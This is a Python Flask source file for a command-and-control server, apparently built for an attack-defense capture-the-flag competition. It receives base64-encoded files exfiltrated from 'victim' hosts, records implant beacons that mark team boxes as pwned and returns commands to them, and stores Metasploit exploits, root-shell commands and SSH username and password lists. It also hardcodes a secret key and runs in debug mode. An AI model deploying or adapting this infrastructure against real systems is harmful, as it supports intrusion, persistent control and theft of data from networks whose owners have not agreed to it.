from base64 import b64decode
from datetime import datetime

from flask import Flask, request, render_template, flash, redirect, url_for
from flask_bootstrap import Bootstrap
from flask_sqlalchemy import SQLAlchemy

# Constants
PORT = 80
DEBUG = True
TEMPLATE_DIR = "templates"
DB_FILE = "c2.db"
LOG_FILE = "c2.log"

# Default settings
DEFAULT_SUBNET = "172.16.T.B"
DEFAULT_WHITELISTED_IPS = "127.0.0.1"

# Create Flask and database
app = Flask(__name__, template_folder=TEMPLATE_DIR)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + DB_FILE
app.secret_key = "poop"
db = SQLAlchemy(app)
Bootstrap(app)


def main():
    # Create the database
    db.create_all()

    # Create default settings
    if not Setting.query.get("subnet"):
        db.session.add(Setting("subnet", DEFAULT_SUBNET,
                               "Subnet teams are on, T should replace team number and B should replace box IP"))
        db.session.commit()
    if not Setting.query.get("whitelisted_ips"):
        db.session.add(Setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
                               "IPs, separated by commas and no spaces, that are allowed to access admin site"))
        db.session.commit()

    # Start Flask
    app.run(port=PORT, debug=DEBUG)


# Protect the admin routes
@app.before_request
def check_admin():
    settings = Setting.query.get("whitelisted_ips")
    ips = settings.value.split(",")
    if request.path.startswith("/admin") and request.remote_addr not in ips:
        return ""


@app.route("/admin", methods=["GET"])
def admin_home():
    return render_template("home.html", total_boxes=Box.query.count(),
                           pwned_boxes=Box.query.filter_by(pwned=True).count(),
                           flag_boxes=Box.query.filter_by(flags=True).count(),
                           flags_found=Flag.query.count(),
                           flags_submitted=Flag.query.filter(Flag.submitted.isnot(None)).count())


@app.route("/admin/settings", methods=["GET"])
def admin_settings():
    return render_template("settings.html", settings=Setting.query.all())


@app.route("/admin/settings/update", methods=["POST"])
def admin_settings_update():
    # Get form data
    name = request.form.get("name")
    value = request.form.get("value")

    # Update in database
    setting = Setting.query.get(name)
    setting.value = value
    db.session.commit()

    # Flash and redirect
    flash("Setting updated")
    return redirect(url_for("admin_settings"))


@app.route("/admin/teams", methods=["GET"])
def admin_teams():
    return render_template("teams.html", teams=Team.query.order_by(Team.num).all())


@app.route("/admin/teams/add", methods=["POST"])
def admin_teams_add():
    # Get form data
    num = request.form.get("num")
    name = request.form.get("name")

    # Add to database
    db.session.add(Team(num, name))
    for service in Service.query.all():
        db.session.add(Box(num, service.ip, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Team added")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/delete", methods=["GET"])
def admin_teams_delete():
    # Get parameters
    num = request.args.get("num")

    # Delete from database
    team = Team.query.get(num)
    db.session.delete(team)
    db.session.commit()

    # Flash and redirect
    flash("Team deleted")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/update", methods=["POST"])
def admin_teams_update():
    # Get form data
    num = request.form.get("num")
    name = request.form.get("name")

    # Update in database
    team = Team.query.get(num)
    team.name = name
    db.session.commit()

    # Flash and redirect
    flash("Team updated")
    return redirect(url_for("admin_teams"))


@app.route("/admin/services", methods=["GET"])
def admin_services():
    return render_template("services.html", services=Service.query.order_by(Service.ip).all())


@app.route("/admin/services/add", methods=["POST"])
def admin_services_add():
    # Get form data
    ip = request.form.get("ip")
    name = request.form.get("name")
    port = request.form.get("port")
    ssh_port = request.form.get("ssh_port")

    # Add to database
    db.session.add(Service(ip, name, port, ssh_port))
    for team in Team.query.all():
        db.session.add(Box(team.num, ip, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Service added")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/delete", methods=["GET"])
def admin_services_delete():
    # Get parameters
    ip = request.args.get("ip")

    # Delete from database
    service = Service.query.get(ip)
    db.session.delete(service)
    db.session.commit()

    # Flash and redirect
    flash("Service deleted")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/update", methods=["POST"])
def admin_services_update():
    # Get form data
    ip = request.form.get("ip")
    name = request.form.get("name")
    port = request.form.get("port")
    ssh_port = request.form.get("ssh_port")

    # Update in database
    service = Service.query.get(ip)
    service.name = name
    service.port = port
    service.ssh_port = ssh_port
    db.session.commit()

    # Flash and redirect
    flash("Service updated")
    return redirect(url_for("admin_services"))


@app.route("/admin/boxes", methods=["GET"])
def admin_boxes():
    return render_template("boxes.html", boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(),
                           subnet=half_subnet())


@app.route("/admin/flags", methods=["GET"])
def admin_flags():
    return render_template("flags.html", flags=Flag.query.order_by(Flag.found.desc()).all(), subnet=half_subnet())


@app.route("/admin/exfils", methods=["GET"])
def admin_exfils():
    return render_template("exfils.html", exfils=ExfilData.query.order_by(ExfilData.found.desc()).all(),
                           subnet=half_subnet())


@app.route("/admin/exfils/view", methods=["GET"])
def admin_exfils_view():
    # Get parameters
    id = request.args.get("id")

    # Get from database
    exfil_data = ExfilData.query.get(id)

    # Return the data
    return exfil_data.data


@app.route("/admin/msfs", methods=["GET"])
def admin_msfs():
    return render_template("msfs.html", msfs=MSFExploit.query.all(), services=Service.query.order_by(Service.ip).all())


@app.route("/admin/msfs/add", methods=["POST"])
def admin_msfs_add():
    # Get form data
    service_ip = request.form.get("service_ip")
    exploit = request.form.get("exploit")
    options = request.form.get("options")
    payload = request.form.get("payload")

    # Add to database
    db.session.add(MSFExploit(service_ip, exploit, options, payload, None))
    db.session.commit()

    # Flash and redirect
    flash("MSF exploit added")
    return redirect(url_for("admin_msfs"))


@app.route("/admin/msfs/delete", methods=["GET"])
def admin_msfs_delete():
    # Get parameters
    id = request.args.get("id")

    # Delete from database
    msf_exploit = MSFExploit.query.get(id)
    db.session.delete(msf_exploit)
    db.session.commit()

    # Flash and redirect
    flash("MSF exploit deleted")
    return redirect(url_for("admin_msfs"))


@app.route("/admin/msfs/update", methods=["POST"])
def admin_msfs_update():
    # Get form data
    id = request.form.get("id")
    service_ip = request.form.get("service_ip")
    exploit = request.form.get("exploit")
    options = request.form.get("options")
    payload = request.form.get("payload")

    # Update in database
    msf_exploit = MSFExploit.query.get(id)
    msf_exploit.service_ip = service_ip
    msf_exploit.exploit = exploit
    msf_exploit.options = options
    msf_exploit.payload = payload
    db.session.commit()

    # Flash and redirect
    flash("MSF exploit updated")
    return redirect(url_for("admin_msfs"))


# Exfil route
@app.route("/e", methods=["POST"])
def exfil():
    # Get form data
    victimip = request.form.get("victimip")
    filename = request.form.get("filename")
    data = request.form.get("file")

    # Check if it exists
    if not victimip:
        log("Exfil - victimip missing")
        return ""
    elif not filename:
        log("Exfil - filename missing")
        return ""
    elif not data:
        log("Exfil - file missing")
        return ""

    # Decode data
    try:
        exfil = b64decode(data).decode("utf-8")
    except:
        log(f"Exfil - b64 decode error for {data} on host {victimip}")
        return ""

    # Get team and service
    try:
        team = victimip.split(".")[2]
        service = victimip.split(".")[3]
    except:
        log(f"Exfil - error decoding IP {victimip} for file {filename}")
        return ""

    # Save the data
    try:
        db.session.add(ExfilData(team, service, filename, exfil, datetime.now()))
        db.session.commit()
    except:
        log(f"Exfil - error adding data for team {team} and service {service} for file {filename}")
        return ""
    log(f"Exfil - saved data from team {team} and service {service}")
    return ""


# Update route
@app.route("/u", methods=["POST"])
def update():
    # Get form data
    victimip = request.form.get("victimip")

    # Check if it exists
    if not victimip:
        log("Update - victimip missing")
        return ""

    # Get team and service
    try:
        team = victimip.split(".")[2]
        service = victimip.split(".")[3]
    except:
        log(f"Update - error decoding IP {victimip}")
        return ""

    # Get the Box
    box = Box.query.get((team, service))
    if not box:
        log(f"Update - no record for team {team} and service {service}")
        return ""

    # Update the Box
    box.pwned = True
    box.last_update = datetime.now()
    db.session.commit()

    # Return the status
    log(f"Update - status {box.status} sent to team {team} and service {service}")
    return box.status


# Catch all 404s and 405s
@app.errorhandler(404)
@app.errorhandler(405)
def catch_all(e):
    return ""


def half_subnet():
    parts = Setting.query.get("subnet").value.split(".")
    return f"{parts[0]}.{parts[1]}."


def log(info):
    print(info)
    with open(LOG_FILE, "a+") as f:
        f.write(f"{datetime_string()} - {info}\n")


def datetime_string():
    return datetime.now().strftime("%m/%d/%Y %H:%M:%S")


class Setting(db.Model):
    name = db.Column(db.Text, primary_key=True)
    value = db.Column(db.Text, nullable=False)
    description = db.Column(db.Text, nullable=False)

    def __init__(self, name, value, description):
        self.name = name
        self.value = value
        self.description = description


class Team(db.Model):
    num = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, nullable=False)

    def __init__(self, num, name):
        self.num = num
        self.name = name


class Service(db.Model):
    ip = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Integer, nullable=False)
    port = db.Column(db.Integer, nullable=False)
    ssh_port = db.Column(db.Integer, nullable=False)

    def __init__(self, ip, name, port, ssh_port):
        self.ip = ip
        self.name = name
        self.port = port
        self.ssh_port = ssh_port


class Box(db.Model):
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), primary_key=True)
    team = db.relationship(Team, backref=db.backref("boxes", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), primary_key=True)
    service = db.relationship(Service, backref=db.backref("boxes", cascade="all, delete-orphan"))
    pwned = db.Column(db.Boolean, nullable=False)
    last_update = db.Column(db.DateTime, nullable=True)
    flags = db.Column(db.Boolean, nullable=False)
    last_flag = db.Column(db.DateTime, nullable=True)

    def __init__(self, team_num, service_ip, pwned, last_update, flags, last_flag):
        self.team_num = team_num
        self.service_ip = service_ip
        self.pwned = pwned
        self.last_update = last_update
        self.flags = flags
        self.last_flag = last_flag


class Flag(db.Model):
    flag = db.Column(db.Text, primary_key=True)
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    team = db.relationship(Team, backref=db.backref("flags", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("flags", cascade="all, delete-orphan"))
    found = db.Column(db.DateTime, nullable=False)
    submitted = db.Column(db.DateTime, nullable=True)

    def __init__(self, flag, team_num, service_ip, found, submitted):
        self.flag = flag
        self.team_num = team_num
        self.service_ip = service_ip
        self.found = found
        self.submitted = submitted


class ExfilData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    team = db.relationship(Team, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
    filename = db.Column(db.Text, nullable=False)
    data = db.Column(db.Text, nullable=False)
    found = db.Column(db.DateTime, nullable=False)

    def __init__(self, team_num, service_ip, filename, data, found):
        self.team_num = team_num
        self.service_ip = service_ip
        self.filename = filename
        self.data = data
        self.found = found


class MSFExploit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("msf_exploits", cascade="all, delete-orphan"))
    exploit = db.Column(db.Text, nullable=False)
    options = db.Column(db.Text, nullable=False)
    payload = db.Column(db.Text, nullable=False)
    last_success = db.Column(db.DateTime, nullable=True)

    def __init__(self, service_ip, exploit, options, payload, last_success):
        self.service_ip = service_ip
        self.exploit = exploit
        self.options = options
        self.payload = payload
        self.last_success = last_success


class FlagRetrieval(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("flag_retrievals", cascade="all, delete-orphan"))
    root_shell = db.Column(db.Boolean, nullable=False)
    command = db.Column(db.Text, nullable=False)

    def __init__(self, service_ip, root_shell, command):
        self.service_ip = service_ip
        self.root_shell = root_shell
        self.command = command


class SSHUsername(db.Model):
    username = db.Column(db.Text, primary_key=True)

    def __init__(self, username):
        self.username = username


class SSHPassword(db.Model):
    password = db.Column(db.Text, primary_key=True)

    def __init__(self, password):
        self.password = password


if __name__ == "__main__":
    main()
